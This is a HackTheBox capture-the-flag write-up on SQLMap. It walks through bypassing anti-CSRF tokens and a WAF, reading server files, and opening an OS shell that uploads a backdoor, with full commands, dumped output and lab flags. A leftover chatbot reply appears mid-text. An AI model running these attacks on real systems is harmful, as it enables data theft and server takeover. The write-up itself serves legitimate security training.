# HTB-Writeup-AdvancedSQlMap
HackTheBox Advanced SQLMAP Writeup: exploiting SQL injection vulnerabilities, focusing on bypassing common security mechanisms like anti-CSRF tokens, parameter randomization, and web application firewalls (WAF), while reinforcing database hardening.

By Ramyar Daneshgar 

---

#### **Objective**
To exploit an SQL injection vulnerability in the `id` parameter of the POST request to `case8.php`, bypassing the **anti-CSRF token** protection, and retrieve the `flag8` table's contents using SQLMap.

---

### **Step-by-Step Process**

#### **Step 1: Reconnaissance and Analyzing the Web Request**
1. **Observation**:  
   After accessing the target system's root page and selecting "Case #8," I identified that the vulnerable endpoint requires submitting a POST request.
   
2. **Network Analysis**:  
   Using browser developer tools, I inspected the **Network Tab** while interacting with the "Submit" button to monitor the POST request sent to `case8.php`. Key observations included:
   - The `id` parameter is injectable and carries user-controlled input.
   - The request includes an **anti-CSRF token (`t0ken`)**, which acts as a mitigation against automated exploitation and replay attacks.

---

#### **Step 2: Exploit Preparation**
3. **Understanding Anti-CSRF Protections**:  
   Anti-CSRF tokens are security features designed to ensure that HTTP requests are initiated by authenticated and authorized users. In this scenario, the application dynamically generates a token value, which SQLMap must dynamically parse and inject into its payloads.

4. **Crafting the Exploit**:  
   I prepared the following SQLMap command, incorporating the `--csrf-token` flag to instruct SQLMap to dynamically handle the anti-CSRF token:
   ```bash
   sqlmap -u 'http://[target IP]:[target port]/case8.php' \
          --data 'id=1&t0ken=<anti-CSRF token>' \
          --csrf-token=t0ken --batch --dump
   ```
   - **URL (`-u`)**: Specifies the target endpoint.
   - **POST Data (`--data`)**: Injects the payload into the `id` parameter.
   - **Anti-CSRF Token Handling (`--csrf-token`)**: Automatically updates the token to bypass protection.

---

#### **Step 3: Execution**
5. **Running the Exploit**:  
   Executing the above command, SQLMap began probing the database using various techniques, including **boolean-based blind** and **UNION-based SQL injection**, while dynamically updating the token. SQLMap successfully identified the following:
   - The backend DBMS: MySQL
   - The database: `testdb`
   - The table: `flag8`

6. **Dumping Table Data**:  
   SQLMap extracted and saved the contents of the `flag8` table:
   ```bash
   Database: testdb
   Table: flag8
   [1 entry]
   +----+-----------------------------------+
   | id | content                           |
   +----+-----------------------------------+
   | 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
   +----+-----------------------------------+
   ```

---

### **Lessons Learned**
1. **Anti-CSRF Mechanism Limitations**:  
   While effective against some automated attacks, weak implementation (e.g., tokens embedded in predictable parameters) can be bypassed using automated tools like SQLMap.
   
2. **SQLMap Features**:  
   SQLMap's ability to handle anti-CSRF tokens highlights its utility for penetration testers, particularly when bypassing client-side security mechanisms.
   
3. **Defensive Strategies**:  
   To mitigate such attacks:
   - Sanitize and parameterize user inputs.
   - Use strong, unpredictable anti-CSRF tokens and validate them on the server side.
   - Restrict database user privileges to minimize the impact of SQL injection.

No, the previous walkthrough does not include the **Skills Assessment** section. However, I can create a similar detailed write-up for the Skills Assessment tasks. Here's a structured breakdown for those:

---

### **Skills Assessment**


---

**Objective**  
Retrieve the `final_flag` table's contents from the `production` database by exploiting a POST request with JSON data, bypassing advanced protections such as parameter tampering, WAF, and query obfuscation.

---

#### **Step-by-Step Process**

1. **Reconnaissance**  
   - **Navigating the Target**: I accessed the root page of the web application and explored all available functionality.  
   - **Identifying the Attack Surface**:  
     - Clicking through buttons in the interface while monitoring the **Network Tab** revealed a POST request under the **Catalog -> Shop** section when adding items to the cart.
     - The POST request included a JSON body with a parameter `id`.

   - **Captured Request Example**:
     ```plaintext
     POST /action.php HTTP/1.1
     Host: [Target IP]:[Target Port]
     User-Agent: Mozilla/5.0
     Content-Type: application/json
     Content-Length: 8

     {"id":1}
     ```

---

2. **Preparing SQLMap for Exploitation**  
   - I saved the raw HTTP request to a file (`request.req`) for SQLMap processing.
   - SQLMap required additional options to bypass protections:
     - `--level 5`: Increases the depth of payload testing.
     - `--risk 3`: Enables riskier payloads to probe advanced injection points.
     - `--tamper=between`: Applies tampering techniques to obfuscate SQL keywords.
     - `--technique=t`: Limits exploitation techniques to time-based injection.

   - The final command:
     ```bash
     sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
     ```

---

3. **Exploitation and Results**  
   - **SQLMap Execution**:  
     - SQLMap parsed the JSON body and detected time-based blind SQL injection in the `id` parameter.
     - It enumerated the database structure, revealing the `production` database and the `final_flag` table.

   - **Optimizing Data Retrieval**:  
     I refined the SQLMap command to focus on the `final_flag` table only:
     ```bash
     sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t -D production -T final_flag
     ```

   - **Output**:
     ```plaintext
     Database: production
     Table: final_flag
     [1 entry]
     +----+--------------------------+
     | id | content                  |
     +----+--------------------------+
     | 1  | HTB{n07_50_h4rd_r16h7?!} |
     +----+--------------------------+
     ```

---

**Objective**  
Use SQLMap to read the contents of `/flag.txt` on the remote host by exploiting a GET parameter (`id`) and bypassing file access restrictions.

---

#### **Step-by-Step Process**

1. **Reconnaissance**  
   - By inspecting the website, I observed that the `id` parameter in a GET request was vulnerable to SQL injection.
   - The objective was to use SQLMap’s `--file-read` feature to fetch the `/flag.txt` file from the server.

---

2. **Exploitation with SQLMap**  
   - Command to retrieve `/flag.txt`:
     ```bash
     sqlmap -u "http://[Target IP]:[Target Port]?id=1" --file-read="/flag.txt" --batch
     ```

   - **Execution**:
     - SQLMap detected the injection point and successfully fetched the `/flag.txt` file.
     - The file was saved locally by SQLMap in the output directory.

   - **Verifying the File**:
     I used `cat` to view the file contents:
     ```bash
     cat ~/.sqlmap/output/[Target IP]/files/_flag.txt
     ```

   - **Output**:
     ```plaintext
     HTB{5up3r_u53r5_4r3_p0w3rful!}
     ```


---

**Objective**  
Use SQLMap to gain an interactive OS shell on the remote server and retrieve the flag from `/root/flag.txt`.

---

#### **Step-by-Step Process**

1. **Launching an OS Shell**  
   - Command to initiate an OS shell:
     ```bash
     sqlmap -u "http://[Target IP]:[Target Port]?id=1" --os-shell --technique=E --batch
     ```

   - **Execution**:
     - SQLMap leveraged error-based SQL injection to upload a file stager and backdoor to the server.
     - After confirming successful file uploads, SQLMap provided an interactive OS shell.

---

2. **Retrieving the Flag**  
   - I used basic Linux commands in the shell to locate and read the flag:
     ```bash
     os-shell> cat /root/flag.txt
     ```

   - **Output**:
     ```plaintext
     HTB{n3v3r_run_db_45_db4}
     ```

---

### **Lessons Learned**

1. **Mitigation of Advanced SQL Injection**:
   - Implement strict input validation and output encoding to prevent SQL injection attacks.
   - Disable error messages that could assist attackers in identifying vulnerabilities.
   - Use Web Application Firewalls (WAF) with signature-based and behavioral rules.

2. **Access Controls**:
   - Limit database user privileges to only what is necessary.
   - Disable access to file system functions such as `LOAD_FILE()` and `INTO OUTFILE`.

3. **Importance of Defense-in-Depth**:
   - Use multi-layered security controls, such as anti-CSRF, input sanitization, and least privilege access.
   - Regularly audit application security and patch vulnerabilities timely.

